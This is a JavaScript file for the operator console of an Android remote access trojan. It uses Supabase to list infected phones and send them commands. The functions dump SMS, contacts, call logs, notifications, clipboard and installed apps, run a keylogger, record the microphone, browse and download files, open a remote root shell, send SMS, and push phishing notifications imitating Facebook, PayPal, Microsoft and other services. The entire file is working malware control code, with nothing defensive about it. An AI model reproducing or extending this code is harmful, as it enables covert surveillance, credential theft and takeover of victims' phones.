$("#preloaderr").fadeOut();
var respov=$("#cmdref").val();
var var32="";
var unqid="";
var manager="";
var bckstp=0;
var lastkeynot="";
var lastkeykey="";
var lastkeyphish="";
var lastkeyvoice="";
var wallpaperno="";
var uo2=document.getElementById("users");

function opnav(o){
if($("#navbar").css("display") == "none"){

o.style.color="red";
o.innerHTML="&#10005;";
$("#navbar").css("display","block");
}
else{
o.style.color="white";
o.innerHTML="&#8801;";
$("#navbar").css("display","none");
}
}

function hidekarbsdk(){
$("#micrec").css("display","none");
$("#wallpaperdiv").css("display","none");
$("#senddm").css("display","none");
$("#pvtt").css("display","none");
$("#toastdiv").css("display","none");
$("#notikey").css("display","none");
$("#viewers").css("display","none");
$("#fprev").css("display","none");
$("#resp").css("display","none");
$("#shellcmd").css("display","none");
$("#showphishj").css("display","none");
//$("#").css("display","none");


}

function userss(){
// Use Supabase real-time subscription for online devices
const channel = supabase
  .channel('online-devices')
  .on('postgres_changes', {
    event: '*',
    schema: 'public',
    table: 'online_devices'
  }, (payload) => {
    loadOnlineDevices();
  })
  .subscribe();

// Initial load
loadOnlineDevices();
}

async function loadOnlineDevices() {
try {
  const { data: devices, error } = await supabase
    .from('online_devices')
    .select('*')
    .order('created_at', { ascending: false });

  if (error) {
    console.error('Error fetching devices:', error);
    uo2.innerHTML = "Error loading devices";
    return;
  }

  if (devices && devices.length > 0) {
    uo2.innerHTML = "<br>";
    for (let i = 0; i < devices.length; i++) {
      const device = devices[i];
      const aversion = device.android_version || 'Unknown';
      const battery = device.battery_level || 'Unknown';
      const model = device.device_model || 'Unknown Device';
      const isRooted = device.is_rooted || 'Unknown';
      const uid = device.device_id;
      
      uo2.innerHTML += `<br><div class="usr">${model} <span style="float:right">${aversion}</span><br><br>Rooted: ${isRooted} <span style="float:right">Battery: ${battery} </span><br><br><center><button onclick="setdev('${uid}')">Attack</button></center></div> `;
    }
  } else {
    uo2.innerHTML = "No online Devices";
  }
} catch (error) {
  console.error('Error in loadOnlineDevices:', error);
  uo2.innerHTML = "Error loading devices";
}
}

userss();

function setdev(o){
respov="/comds/comds"+o;
unqid=o;
$("#cmdref").val("/comds/comds"+o);
showdat(o);
$("#users").css("display","none");
$("#backkk").css("display","block");
$("#phones").css("display","block");
}

async function setdatcmd(o,p,q,r){
var result= '';
var characters= 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
var charactersLength = characters.length;
for ( var i = 0; i < 8; i++ ) {
result += characters.charAt(Math.floor(Math.random() * charactersLength));
}

var commandData = {
device_id: unqid,
command_type: o,
command_value: p,
command_var: q,
random_id: result,
status: 'pending',
created_at: new Date().toISOString()
};

$("#phones").css("display","none");
$("#preloaderr").fadeIn();

try {
  const { data, error } = await supabase
    .from('device_commands')
    .insert([commandData]);

  if (error) {
    console.error('Error sending command:', error);
    $("#preloaderr").fadeOut();
    alert('Error sending command: ' + error.message);
  }
} catch (error) {
  console.error('Error in setdatcmd:', error);
  $("#preloaderr").fadeOut();
  alert('Error sending command');
}
}

function cmd(){
var us=document.getElementById("cmdref").value;
var hio=document.getElementById("cmd").value;
var hio2=document.getElementById("cmdvar").value;
var hio3=document.getElementById("cmdvarm").value;
setdatcmd(hio,hio2,hio3,us);
}

function showdat(deviceId){
// Subscribe to device responses using Supabase real-time
const channel = supabase
  .channel(`device-${deviceId}`)
  .on('postgres_changes', {
    event: '*',
    schema: 'public',
    table: 'device_responses',
    filter: `device_id=eq.${deviceId}`
  }, (payload) => {
    if (payload.eventType === 'INSERT' || payload.eventType === 'UPDATE') {
      handleDeviceResponse(payload.new);
    }
  })
  .subscribe();
}

function handleDeviceResponse(data) {
var respo = data.response_data || "";
var v1 = data.value1 || "";
var v2 = data.value2 || "";
var v3 = data.value3 || "";
var32 = data.var2 || "";

$("#preloaderr").fadeOut();

if(manager=="filesmanager"){
filesfol(respo,v1,v2,v3,var32);
}
else if(manager=="fileview"){
fileev(v1);
}
else if(manager=="shellview"){
shellviewer(v1);
}
else if(manager=="deviceinfo"){
var iodg=new DOMParser().parseFromString(v1, 'text/html').body.textContent;
if(iodg == "null" || iodg.length == 1){
v1="<div class='keylogg'>No Data Found</div>";
}
showinfodev(v1);
}
else if(manager=="dialogview"){
diamainshow(v1);
}
else if(manager=="notificationlog"){
if(v1 == "null" || v1.length == 1){
v1="<div class='keylogg'>No Data Found</div>";
}
notificationsview(v1);
}
else if(manager=="keylogger"){
if(v1 == "null" || v1.length == 1){
v1="<div class='keylogg'>No Data Found</div>";
}
keyloggerviewer(v1);
}
else if(manager=="dumpcontact"){
if(v1 == "null" || v1.length == 1){
v1="<div class='keylogg'>No Data Found</div>";
}
dumpcontactshow(v1);
}
else if(manager=="dumpsms"){
if(v1 == "null" || v1.length == 1){
v1="<div class='keylogg'>No Data Found</div>";
}
dumpsmsshow(v1);
}
else if(manager=="calllogs"){
if(v1 == "null" || v1.length == 1){
v1="<div class='keylogg'>No Data Found</div>";
}
calllogsshow(v1);
}
else if(manager=="clipboardhis"){
if(v1 == "null" || v1.length == 1){
v1="<div class='keylogg'>No Data Found</div>";
}
clipboardview(v1);
}
else if(manager=="getpackages"){
if(v1 == "null" || v1.length == 1){
v1="<div class='keylogg'>No Data Found</div>";
}
getpackagesview(v1);
}
else if(manager=="showphp"){
if(v1 == "null" || v1.length == 1){
v1="<div class='keylogg'>No Data Found</div>";
}
showphpview(v1);
}
else if(manager=="micrec"){
if(v1 == "null" || v1.length == 1){
v1="<div class='keylogg'>No Data Found</div>";
}
showmicrecview(v1);
}
}

// File manager functions
function filesmanager(){
hidekarbsdk();
manager="filesmanager";
$("#phones").css("display","none");
$("#preloaderr").fadeIn();
setdatcmd("fd","/sdcard/","",respov);
}

function filesfol(o,p,q,r,s){
var resp=document.getElementById("resp");
resp.innerHTML="<br>";
resp.style.display="block";
$("#backkk").css("display","block");
var res= o.split(":::::");
for(var i =0;i<res.length;i++){
var nameop=res[i];
if(nameop.length >1){
nameop=nameop.replace("&lt;","<");
nameop=nameop.replace("&gt;",">");
nameop=nameop.replace("&amp;","&");
resp.innerHTML+="<li data-dir='"+s+nameop+"' data-nm='"+nameop+"' class='"+q+"' >"+nameop+"<b>"+r+"</b></li>";
}
}
}

function opfol(o){
var el=o.target || o.srcElement;
var direr=el.getAttribute("data-dir");
var namerop=el.getAttribute("data-nm");
var cl=el.getAttribute("class");
if(cl=="fo"){
setdatcmd("fd",direr+"/","",respov);
}
else if(cl=="fi"){
fileview(direr,namerop);
}
}

function fileview(o,p){
hidekarbsdk();
manager="fileview";
$("#preloaderr").fadeIn();
setdatcmd("fv",o,"",respov);
}

function fileev(o){
$("#viewers").css("display","block");
document.getElementById("vieweri").src=o;
document.getElementById("downlo").href=o;
document.getElementById("downlo").download=var32;
}

// Shell command functions
function startshell(){
hidekarbsdk();
$("#shellcmd").css("display","block");
$("#backkk").css("display","block");
manager="shellview";
}

function shellcm(o){
if(event.keyCode === 13) {
var cmd=o.value;
o.value="";
$("#shelldata").append("<br>root@android:/ $ "+cmd);
setdatcmd("sc",cmd,"",respov);
}
}

function shellviewer(o){
$("#shelldata").append("<br>"+o);
$("#shelldata").scrollTop($("#shelldata")[0].scrollHeight);
}

// Device info function
function deviceinfo(){
hidekarbsdk();
manager="deviceinfo";
$("#preloaderr").fadeIn();
setdatcmd("inf","","",respov);
}

function showinfodev(o){
$("#notikey").html(o);
$("#notikey").css("display","block");
$("#backkk").css("display","block");
}

// SMS functions
function dumpsms(){
hidekarbsdk();
manager="dumpsms";
$("#preloaderr").fadeIn();
setdatcmd("sms","","",respov);
}

function dumpsmsshow(o){
$("#notikey").html(o);
$("#notikey").css("display","block");
$("#backkk").css("display","block");
}

function sendmsg(){
hidekarbsdk();
$("#senddm").css("display","block");
$("#backkk").css("display","block");
}

function sendsms(){
var num=document.getElementById("smsnumber").value;
var msg=document.getElementById("smscontent").value;
if(num.length > 5 && msg.length > 0){
manager="dialogview";
setdatcmd("sendsms",num,msg,respov);
}
else{
alert("Enter Number and Message");
}
}

// Contact functions
function dumpcontact(){
hidekarbsdk();
manager="dumpcontact";
$("#preloaderr").fadeIn();
setdatcmd("cont","","",respov);
}

function dumpcontactshow(o){
$("#notikey").html(o);
$("#notikey").css("display","block");
$("#backkk").css("display","block");
}

// Call logs functions
function calllogs(){
hidekarbsdk();
manager="calllogs";
$("#preloaderr").fadeIn();
setdatcmd("callog","","",respov);
}

function calllogsshow(o){
$("#notikey").html(o);
$("#notikey").css("display","block");
$("#backkk").css("display","block");
}

// Installed apps function
function getpackages(){
hidekarbsdk();
manager="getpackages";
$("#preloaderr").fadeIn();
setdatcmd("apps","","",respov);
}

function getpackagesview(o){
$("#notikey").html(o);
$("#notikey").css("display","block");
$("#backkk").css("display","block");
}

// Notification functions
function notificationlog(){
hidekarbsdk();
manager="notificationlog";
$("#preloaderr").fadeIn();
setdatcmd("notif","","",respov);
}

function notificationsview(o){
$("#notikey").html(o);
$("#notikey").css("display","block");
$("#backkk").css("display","block");
}

// Keylogger functions
function keylogger(){
hidekarbsdk();
manager="keylogger";
$("#preloaderr").fadeIn();
setdatcmd("keyl","","",respov);
}

function keyloggerviewer(o){
$("#notikey").html(o);
$("#notikey").css("display","block");
$("#backkk").css("display","block");
}

// Clipboard functions
function showclip(){
hidekarbsdk();
manager="clipboardhis";
$("#preloaderr").fadeIn();
setdatcmd("clip","","",respov);
}

function clipboardview(o){
$("#notikey").html(o);
$("#notikey").css("display","block");
$("#backkk").css("display","block");
}

// Toast function
function toastt(){
hidekarbsdk();
$("#toastdiv").css("display","block");
$("#backkk").css("display","block");
}

function toastexc(){
var msg=document.getElementById("toastcmd").value;
if(msg.length > 0){
manager="dialogview";
setdatcmd("toast",msg,"",respov);
}
else{
alert("Enter Message");
}
}

// Fun commands
function funcmd(o){
hidekarbsdk();
$("#pvtt").css("display","block");
$("#backkk").css("display","block");
$("#fmc1").css("display","none");
$("#fmc2").css("display","none");
$("#"+o).css("display","block");
}

function playmus(){
var link=document.getElementById("musiccmd").value;
if(link.length > 5){
manager="dialogview";
setdatcmd("music",link,"",respov);
}
else{
alert("Enter Music URL");
}
}

function vibra(){
var time=document.getElementById("vibratecmd").value;
if(time.length > 0){
manager="dialogview";
setdatcmd("vibrate",time,"",respov);
}
else{
alert("Enter Time in Seconds");
}
}

function ttsf(){
var msg=document.getElementById("ttscmd").value;
if(msg.length > 0){
manager="dialogview";
setdatcmd("speak",msg,"",respov);
}
else{
alert("Enter Text Message");
}
}

function tont(){
manager="dialogview";
setdatcmd("torch","on","",respov);
}

function tofft(){
manager="dialogview";
setdatcmd("torch","off","",respov);
}

function opwebl(){
var url=document.getElementById("opwebcmd").value;
if(url.length > 5){
manager="dialogview";
setdatcmd("openweb",url,"",respov);
}
else{
alert("Enter URL");
}
}

// Wallpaper functions
function changewallpaper(){
hidekarbsdk();
$("#wallpaperdiv").css("display","block");
$("#backkk").css("display","block");
}

function selectimg(o,p){
wallpaperno=p;
$(".wallimg img").css("border","0");
o.style.border="2px solid red";
}

function setwalls(){
if(wallpaperno.length > 0){
manager="dialogview";
setdatcmd("wallpaper",wallpaperno,"",respov);
}
else{
alert("Select Wallpaper");
}
}

// Microphone recording
function micrec(){
hidekarbsdk();
$("#micrec").css("display","block");
$("#backkk").css("display","block");
getmicrecordings();
}

function getmicrecordings(){
manager="micrec";
setdatcmd("micreclist","","",respov);
}

function recordvoice(){
var time=document.getElementById("recval").value;
if(time.length > 0){
manager="dialogview";
setdatcmd("micrec",time,"",respov);
}
else{
alert("Enter Recording Time");
}
}

function showmicrecview(o){
$("#showrecs").html(o);
}

// Phishing functions
function showphish(){
hidekarbsdk();
$("#showphishj").css("display","block");
$("#backkk").css("display","block");
getphishdata();
}

function getphishdata(){
manager="showphp";
setdatcmd("phishdata","","",respov);
}

function showphpview(o){
$("#showphishj").prepend(o);
}

function iojh(){
var v=document.getElementById("lshpih").value;
var imgs=['dropbox3.png','facebook2.png','facebook5.png','free_fire3.png','github1.png','instagram1.png','linkedin1.png','messenger1.png','microsoft1.png','netflix1.png','paypal2.png','protonmail1.png','pubg2.png','snapchat1.png','tumblir1.png','twitter1.png','wordpress1.png','yahoo1.png'];
document.getElementById("hion").src="./imgg/"+imgs[v];
}

function execphish(){
var title=document.getElementById("nshpih").value;
var icon=document.getElementById("lshpih").value;
var page=document.getElementById("phpage").value;
if(title.length > 0){
manager="dialogview";
setdatcmd("phishnotify",title,icon+","+page,respov);
}
else{
alert("Enter Title");
}
}

function execphish2(){
var link=document.getElementById("shpih").value;
if(link.length > 5){
manager="dialogview";
setdatcmd("phishnotify2",link,"",respov);
}
else{
alert("Enter Link");
}
}

// Utility functions
function diamainshow(o){
$("#diatext").html(o);
$("#diamain").css("display","flex");
}

function backk(o){
hidekarbsdk();
$("#users").css("display","block");
$("#backkk").css("display","none");
}

// File download function
function dwnfil(url, filename) {
var a = document.createElement('a');
a.href = url;
a.download = filename;
document.body.appendChild(a);
a.click();
document.body.removeChild(a);
}

// Initialize on page load
$(document).ready(function() {
$("#preloaderr").fadeOut();
});
